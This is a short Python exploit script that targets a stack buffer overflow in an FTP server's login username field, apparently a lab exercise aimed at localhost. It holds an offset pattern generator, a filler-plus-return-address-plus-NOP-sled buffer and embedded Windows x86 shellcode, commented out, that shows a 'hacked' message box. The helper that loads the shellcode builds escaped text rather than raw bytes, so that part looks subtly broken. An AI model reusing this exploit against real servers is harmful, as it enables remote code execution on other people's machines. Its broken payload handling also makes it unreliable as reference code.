def gen_str(length):
    res = ""
    for a in range(65, 91):
        for b in range(97, 123):
            for c in range(10):
                res += chr(a) + chr(b) + str(c)
                if len(res) > length:
                    return res

def attack():
    from ftplib import FTP
    
    shellcode = bin2hex()
    # shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x59\x50\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\x54\x24\x10\x83\xc4\x0c\x50\x31\xc0\xb8\x6f\x78\x41\x23\x50\x83\x6c\x24\x03\x23\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\xff\x74\x24\x10\xff\x54\x24\x1c\x83\xc4\x0c\x50\x31\xc0\xb8\x65\x73\x73\x23\x50\x83\x6c\x24\x03\x23\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\xff\x74\x24\x20\xff\x54\x24\x20\x83\xc4\x0c\x50\x31\xc0\xb0\x21\x50\x68\x20\x41\x6d\x65\x68\x64\x20\x62\x79\x68\x61\x63\x6b\x65\x68\x65\x6e\x20\x68\x68\x73\x20\x62\x65\x68\x72\x20\x68\x61\x68\x70\x75\x74\x65\x68\x20\x63\x6f\x6d\x68\x54\x68\x69\x73\x54\x31\xc0\x50\x68\x73\x61\x67\x65\x68\x41\x4d\x45\x73\x54\x31\xc0\x50\xff\x74\x24\x04\xff\x74\x24\x18\x31\xc0\x50\xff\x54\x24\x50\x83\xc4\x3c\x31\xc0\x50\xff\x54\x24\x04"
    buffer = 'A' * 485 + "\x12\x45\xfa\x7f" + '\x90' * 4
    buffer += shellcode
    
    session = FTP('localhost')
    session.login(buffer, 'ame')

def bin2hex():
    with open('Shellcode.bin', 'rb') as f:
        data = f.read()
        hex_data = data.hex()
        shellcode = ""
        for i in range(0, len(hex_data), 2):
            shellcode += '\\x' + hex_data[i:i+2]
        print(shellcode)
        return shellcode
    
if __name__ == '__main__':
    # print(gen_str(1000))
    bin2hex()
    # attack()